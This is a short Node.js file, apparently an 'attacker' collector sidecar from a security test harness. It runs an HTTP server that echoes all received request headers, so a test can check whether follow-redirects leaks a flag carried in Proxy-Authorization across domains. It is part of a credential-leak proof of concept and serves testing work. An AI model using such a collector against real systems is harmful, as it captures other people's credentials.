// attacker: cross-domain collector sidecar. Echoes ALL received request headers as JSON.
// If ${PCB_FLAG} (carried in Proxy-Authorization) appears here after the cross-domain
// redirect, the sensitive header was NOT stripped by follow-redirects (credential leak).
import http from 'node:http';

http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(req.headers));
}).listen(80, () => console.log('attacker http collector on 80'));
